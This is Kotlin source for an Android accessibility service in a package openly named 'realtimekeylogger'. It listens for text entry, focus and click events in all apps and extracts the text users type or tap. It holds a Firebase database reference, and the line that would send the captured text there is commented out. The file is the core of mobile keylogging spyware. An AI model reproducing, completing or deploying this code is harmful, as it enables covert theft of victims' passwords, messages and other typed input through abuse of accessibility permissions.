package com.shubhamgupta16.realtimekeylogger.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.FirebaseDatabase

class ASEService : AccessibilityService() {

    val rtdb = FirebaseDatabase.getInstance().reference

    override fun onServiceConnected() {
        super.onServiceConnected()

        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 1000
        info.packageNames = null
        serviceInfo = info
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.text.isNotEmpty() || event.contentDescription != null) {
            if (event.eventType.let {
                    it == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                            it == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                            it == AccessibilityEvent.TYPE_VIEW_CLICKED
                }) {
                val text = event.text.joinToString { it }.ifBlank { null }
                /*sendEvent(
                    event.eventType, text, event.contentDescription
                )*/
            }
        }
    }

    override fun onInterrupt() {
        Log.d("TAG", "onInterrupt: called")
    }
}